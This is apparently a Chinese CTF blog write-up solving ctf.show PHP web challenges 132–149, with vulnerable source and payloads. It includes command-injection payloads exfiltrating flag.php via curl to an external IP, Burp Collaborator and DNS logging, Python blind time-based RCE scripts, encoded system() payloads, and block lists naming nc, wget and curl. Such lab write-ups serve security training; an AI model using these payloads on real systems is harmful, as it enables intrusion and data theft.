<h3 id="web-132"><a href="#web-132" class="headerlink" title="web-132"></a>web-132</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $username = (String)$_GET[&#x27;username&#x27;];</span><br><span class="line">    $password = (String)$_GET[&#x27;password&#x27;];</span><br><span class="line">    $code = (String)$_GET[&#x27;code&#x27;];</span><br><span class="line">    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;</span><br><span class="line">        if($code == &#x27;admin&#x27;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;&amp;的优先度高于||</p>
<p>&#x2F;?code&#x3D;admin&amp;username&#x3D;admin&amp;password&#x3D;1</p>
<h3 id="web-133"><a href="#web-133" class="headerlink" title="web-133"></a>web-133</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flag.php</span><br><span class="line">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class="line">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;</span><br><span class="line">        eval(substr($F,0,6));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;6个字母都还不够呀?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">get传参   F=`$F `;sleep 3</span><br><span class="line">经过substr($F,0,6)截取后 得到  `$F `;</span><br><span class="line">也就是会执行 eval(&quot;`$F `;&quot;);</span><br><span class="line"> </span><br><span class="line">但是因为我们传入的F为`$F `;sleep 3</span><br><span class="line">所以把$F替换为`$F `;sleep 3</span><br><span class="line"> </span><br><span class="line">那么我们执行的就是</span><br><span class="line">eval(&quot;``$F `;sleep 3`&quot;);</span><br><span class="line">也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec(&quot;`$F `;sleep 3&quot;);</span><br><span class="line">前面的命令我们不需要管，但是后面的命令我们可以自由控制。</span><br><span class="line">这样就在服务器上成功执行了 sleep 3</span><br><span class="line">所以 最后就是一道无回显的RCE题目了</span><br></pre></td></tr></table></figure>

<p>无回显我们可以用反弹shell 或者curl外带 或者盲注      </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F `;curl  http://公网ip:4567?p=`命令`</span><br><span class="line">或者：</span><br><span class="line">?F=`$F `;curl http://118.***.***.***/`tail -n 1 flag.php|base64`;</span><br><span class="line">因为flag.php内容太多，直接get的话显示不全，而且会在传输过程中丢失一些字符，所以只读最后一行，然后base64加密。</span><br></pre></td></tr></table></figure>



<p>没有公网ip的话，可以用bp，通过curl结合Burp带出flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F `;curl -X POST -F xx=@flag.php  http://aaa</span><br><span class="line"> </span><br><span class="line">//-X POST  指定 HTTP 请求的方法为 POST</span><br><span class="line">//其中-F 是带文件的形式发送post请求</span><br><span class="line">//xx是上传文件的name值，flag.php就是上传的文件（我们想要的文件的名字）</span><br><span class="line">//aaa是我们在bp中得到的域名地址?F=`$F `;curl -X POST -F xx=@flag.php  http://aaa</span><br><span class="line"> </span><br><span class="line">//-X POST  指定 HTTP 请求的方法为 POST</span><br><span class="line">//其中-F 是带文件的形式发送post请求</span><br><span class="line">//xx是上传文件的name值，flag.php就是上传的文件（我们想要的文件的名字）</span><br><span class="line">//aaa是我们在bp中得到的域名地址</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F `;curl -X POST -F xx=@flag.php  http://zmpb3hsj4xhaa43iui82s2b0xr3hr6.burpcollaborator.net</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F=`$F` ;ping `awk &#x27;/flag/&#x27; flag.php`.g25cok.dnslog.cn</span><br></pre></td></tr></table></figure>

<h3 id="web-134"><a href="#web-134" class="headerlink" title="web-134"></a>web-134</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">$key1 = 0;</span><br><span class="line">$key2 = 0;</span><br><span class="line">if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;</span><br><span class="line">    die(&quot;nonononono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">extract($_POST);</span><br><span class="line">if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;</span><br><span class="line">    die(file_get_contents(&#x27;flag.php&#x27;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>考察： php变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure>

<h3 id="web-135"><a href="#web-135" class="headerlink" title="web-135"></a>web-135</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flag.php</span><br><span class="line">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class="line">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;</span><br><span class="line">        eval(substr($F,0,6));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?F=`$F` ;cp flag.php 2.txt;</span><br><span class="line">/?F=`$F` ;uniq flag.php&gt;4.txt;</span><br></pre></td></tr></table></figure>

<p>uniq命令来自于英文单词unique的缩写，中文译为独特的、唯一的，其功能是用于去除文件中的重复内容行。uniq命令能够去除掉文件中相邻的重复内容行，如果两端相同内容中间夹杂了其他文本行，则需要先使用sort命令进行排序后再去重复，这样保留下来的内容就都是唯一的了。</p>
<h3 id="web-136"><a href="#web-136" class="headerlink" title="web-136"></a>web-136</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function check($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/?c=ls | tee 1</span><br><span class="line">访问url/xx，下载打开发现只有index.php</span><br><span class="line"></span><br><span class="line">/?c=ls / | tee 2</span><br><span class="line">访问url/aa 下载打开发现flag在f149_15_h3r3</span><br><span class="line"></span><br><span class="line">/?c=nl /f149_15_h3r3 | tee 3</span><br><span class="line">访问url/3 下载打开得到flag</span><br></pre></td></tr></table></figure>

<p>tee命令的功能是用于读取标准输入的数据，将其内容转交到标准输出设备中，同时保存成文件。</p>
<h3 id="web-137"><a href="#web-137" class="headerlink" title="web-137"></a>web-137</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">  function __wakeup()&#123;</span><br><span class="line">    die(&quot;private class&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  static function getFlag()&#123;</span><br><span class="line">    echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br></pre></td></tr></table></figure>

<p>ctfshow&#x3D;ctfshow::getflag</p>
<h3 id="web-138"><a href="#web-138" class="headerlink" title="web-138"></a>web-138</h3><p>题目的意思是我们输入的ctfshow中不能出现冒号：</p>
<p> call_user_func中不但可以传字符串也可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class="line">这时候会调用 classname中的 say_hello方法</span><br></pre></td></tr></table></figure>

<p>ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag</p>
<h3 id="web-139"><a href="#web-139" class="headerlink" title="web-139"></a>web-139</h3><blockquote>
<p>这里注意exec与system的区别，system自带回显，而exec没有回显</p>
<p>对于system，可以使用</p>
<p>system(echo ls)        &#x2F;&#x2F;输出ls字符串</p>
<p>system(echo <code>ls</code>)        &#x2F;&#x2F;输出ls结果（要不要echo都可以）</p>
<p>而对于上面的两个命令，如果把system换成exec那么久不会有输出。</p>
</blockquote>
<p>盲打</p>
<p>题目ban了写入文件的权限，所以不能用cp，没有回显了，只能开始盲注了。</p>
<p>利用shell编程的if判断语句配合awk以及cut命令来获取flag</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-cut.html">cut</a>–cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注意空格</span><br><span class="line">awk逐行获取数据</span><br><span class="line">cat flag | awk NR==1</span><br><span class="line"></span><br><span class="line">cut命令逐列获取单个字符</span><br><span class="line">cat flag | awk NR==2 | cut -c 1</span><br><span class="line"></span><br><span class="line">利用if语句来判断命令是否执行</span><br><span class="line">if [ $(cat flag | awk NR==2 | cut -c 1)==$ ];then echo &quot;you are right&quot;;fi </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://ed303475-9f57-4eb0-acdc-36dc217f4163.challenge.ctf.show/?c=&quot;</span><br><span class="line"> </span><br><span class="line">payload = &quot;if [ `ls / -1 | cut -c &#123;&#125; | awk \&quot;NR==&#123;&#125;\&quot;` == \&quot;&#123;&#125;\&quot; ];then sleep 4;fi&quot;</span><br><span class="line"> </span><br><span class="line">result = &quot;++++++++++++++&quot;</span><br><span class="line"> </span><br><span class="line">row = 6</span><br><span class="line">length = 20</span><br><span class="line"> </span><br><span class="line">strings = &quot;qwertyuiopasdfghjklzxcvbnm_-0123456789&quot;</span><br><span class="line"> </span><br><span class="line">for r in range(1,row):</span><br><span class="line">    for c in range(1,length):</span><br><span class="line">        for s in strings:</span><br><span class="line">            target = url+payload.format(c,r,s)</span><br><span class="line">            #print(target)</span><br><span class="line">            try:</span><br><span class="line">                requests.get(target,timeout=3)</span><br><span class="line">            except:</span><br><span class="line">                result += s</span><br><span class="line">                print(result)</span><br><span class="line">                break</span><br><span class="line">    result += &quot; &quot;</span><br></pre></td></tr></table></figure>

<p>得到flag所在文件 f149_15_h3r3，接着盲注文件内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &quot;http://6b2298ad-31ff-4378-a332-9ca05465b29f.challenge.ctf.show/?c=&quot;</span><br><span class="line"> </span><br><span class="line">payload = &quot;if [ `cat /f149_15_h3r3 | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span><br><span class="line"> </span><br><span class="line">result = &quot;++++++++++++++&quot;</span><br><span class="line"> </span><br><span class="line">length = 48</span><br><span class="line"> </span><br><span class="line">strings = &quot;qwertyuiopasdfghjklzxcvbnm_-0123456789&quot;</span><br><span class="line"> </span><br><span class="line">for c in range(1,length):</span><br><span class="line">    for s in strings:</span><br><span class="line">        target = url+payload.format(c,s)</span><br><span class="line">        #print(target)</span><br><span class="line">        try:</span><br><span class="line">            requests.get(target,timeout=2.5)</span><br><span class="line">        except:</span><br><span class="line">            result += s</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br><span class="line">    result += &quot; &quot;</span><br><span class="line"> </span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>因为过滤了{}所以会我们就不加{}出来，跑出来flag然后手动添加就可以了。</p>
<h3 id="web-140"><a href="#web-140" class="headerlink" title="web-140"></a>web-140</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123;</span><br><span class="line">    $f1 = (String)$_POST[&#x27;f1&#x27;];</span><br><span class="line">    $f2 = (String)$_POST[&#x27;f2&#x27;];</span><br><span class="line">    if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123;</span><br><span class="line">        if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123;</span><br><span class="line">            $code = eval(&quot;return $f1($f2());&quot;);</span><br><span class="line">            if(intval($code) == &#x27;ctfshow&#x27;)&#123;</span><br><span class="line">                echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>usleep — 以指定的微秒数延迟执行，返回NULL</p>
<p>没有返回值，直接使其过：if(intval($code) &#x3D;&#x3D; ‘ctfshow’)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f1=usleep&amp;f2=usleep</span><br><span class="line">空加密绕过</span><br><span class="line">f1=sha1&amp;f2=md5</span><br><span class="line">f1=md5&amp;f2=md5</span><br></pre></td></tr></table></figure>

<h3 id="web-141"><a href="#web-141" class="headerlink" title="web-141"></a>web-141</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class="line">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class="line">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class="line"></span><br><span class="line">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        if(preg_match(&#x27;/^\W+$/&#x27;, $v3))&#123;</span><br><span class="line">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class="line">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>题目用的是W，所以为不匹配，<em><strong>所以是一道无字母数字RCE</strong></em>；但是这里还有一个问题，return会中断当前字符串的解释</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;phpinfo();return 1;&quot;);</span><br><span class="line">eval(&quot;return 1;phpinfo();&quot;)</span><br></pre></td></tr></table></figure>

<p>会发现第一句会执行phpinfo()，但是第二句不行，因为return后就中止了。</p>
<p>随意eval(“return phpinfo();”)这样可以执行，但是因为有v1和v2所以没法构造成这样。</p>
<p>但是php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。<strong>1-(‘phpinfo’)()-1;</strong><br>这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;-phpinfo()-<br>现在我们的任务就是取构造命令，<em><strong>那我们就用个简单的方式取反来试一下。</strong></em><br>运行脚本构造system(‘tac f*’)得到 (<del>%8c%86%8c%8b%9a%92)(</del>%8b%9e%9c%df%99%d5)<br>所以最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?v1=1&amp;v2=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1-(&#x27;system&#x27;)(&#x27;tac *a*&#x27;)-1</span><br><span class="line">1-(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)-1</span><br></pre></td></tr></table></figure>

<h3 id="web-142"><a href="#web-142" class="headerlink" title="web-142"></a>web-142</h3><p>&#x2F;?v1&#x3D;0</p>
<h3 id="web-143"><a href="#web-143" class="headerlink" title="web-143"></a>web-143</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?v1=1&amp;v2=1&amp;v3=*(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)*</span><br></pre></td></tr></table></figure>

<h3 id="web-144"><a href="#web-144" class="headerlink" title="web-144"></a>web-144</h3><p>&#x2F;?v1&#x3D;1&amp;v3&#x3D;1&amp;v2&#x3D;-(“%0c%06%0c%0b%05%0d”^”%7f%7f%7f%7f%60%60”)(“%0b%01%03%00%06%00”^”%7f%60%60%20%60%2a”)</p>
<h3 id="web-145"><a href="#web-145" class="headerlink" title="web-145"></a>web-145</h3><p>三目运算符：</p>
<p>&#x2F;?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;?(<del>%8c%86%8c%8b%9a%92)(</del>%8b%9e%9c%df%99%d5):</p>
<p>&#x2F;?v1&#x3D;1&amp;v3&#x3D;|(<del>%8c%86%8c%8b%9a%92)(</del>%8b%9e%9c%df%99%d5)|&amp;v2&#x3D;1</p>
<h3 id="web-146"><a href="#web-146" class="headerlink" title="web-146"></a>web-146</h3><p>&#x2F;?v1&#x3D;1&amp;v3&#x3D;|(<del>%8c%86%8c%8b%9a%92)(</del>%8b%9e%9c%df%99%d5)|&amp;v2&#x3D;1</p>
<h3 id="web-147"><a href="#web-147" class="headerlink" title="web-147"></a>web-147</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_POST[&#x27;ctf&#x27;]))&#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf&#x27;];</span><br><span class="line">    if(!preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$ctfshow)) &#123;</span><br><span class="line">        $ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em><strong>修正符:D 如果使用$限制结尾字符,则不允许结尾有换行;</strong></em> </p>
<p>考察点：create_function()代码注入</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.create-function">https://www.php.net/manual/zh/function.create-function</a></p>
<p>正则的意思是：不能出现以下划线、数字、大小写字母开头并结尾的字符串。很明显，就是要想办法在函数名的头或者尾找一个字符，不影响函数调用。</p>
<p>那么如何绕过呢？在create_function的最前面或者尾部fuzz所有的ASCII字母，可以发现\是可以成功绕过的。</p>
<blockquote>
<p>%5c即 \ 可以绕过正则表达式，正好\在php里代表默认命名空间，具体原理可以看下这篇文章<a target="_blank" rel="noopener" href="https://paper.seebug.org/755/%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E4%BA%86">https://paper.seebug.org/755/，这样我们就可以执行任意命令了</a></p>
<p>参考dotast师傅对\的解释：</p>
<p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径即在当前的空间内调用； 而如果是\function_name()这样的形式去调用函数，则是表示写了一个绝对路径即去\这个空间调用。 如果你在其他namespace里调用系统类，必须使用绝对路径的写法</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/?show=echo 123;&#125;system(&#x27;tac f*&#x27;);//</span><br><span class="line">ctf=\create_function</span><br><span class="line"> </span><br><span class="line">结果就是：</span><br><span class="line">$ctfshow(&#x27;&#x27;,$_GET[&#x27;show&#x27;]);</span><br><span class="line">=&gt;</span><br><span class="line"> </span><br><span class="line">\creat_function(&#x27;&#x27;,&#x27;echo 123;&#125;system(&#x27;tac f*&#x27;);//&#x27;);</span><br><span class="line">=&gt;</span><br><span class="line"> </span><br><span class="line">function f()&#123;</span><br><span class="line">echo 123;&#125;system(&#x27;tac f*&#x27;);//;&#125;</span><br><span class="line"> </span><br><span class="line">=&gt;</span><br><span class="line">function f()&#123;</span><br><span class="line">echo 123;</span><br><span class="line">&#125;</span><br><span class="line">system(&#x27;tac f*&#x27;);//;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web-148"><a href="#web-148" class="headerlink" title="web-148"></a>web-148</h3><p>&#x2F;?code&#x3D;(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0);</p>
<h3 id="web-149"><a href="#web-149" class="headerlink" title="web-149"></a>web-149</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$files = scandir(&#x27;./&#x27;); </span><br><span class="line">foreach($files as $file) &#123;</span><br><span class="line">    if(is_file($file))&#123;</span><br><span class="line">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);</span><br><span class="line">$files = scandir(&#x27;./&#x27;); </span><br><span class="line">foreach($files as $file) &#123;</span><br><span class="line">    